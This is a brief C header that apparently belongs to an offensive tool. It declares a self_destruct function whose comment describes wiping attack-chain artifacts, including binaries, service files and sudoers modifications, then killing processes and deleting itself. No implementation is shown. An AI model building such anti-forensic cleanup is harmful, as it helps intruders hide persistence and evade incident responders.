#ifndef SELF_DESTRUCT_H
#define SELF_DESTRUCT_H

/**
 * self_destruct - Cleans up all artifacts and files created during the attack chain.
 * This includes binaries, service files, temporary directories, and sudoers modifications.
 * After cleanup, it kills associated processes and performs a self-deletion.
 */
void self_destruct();

#endif // SELF_DESTRUCT_H
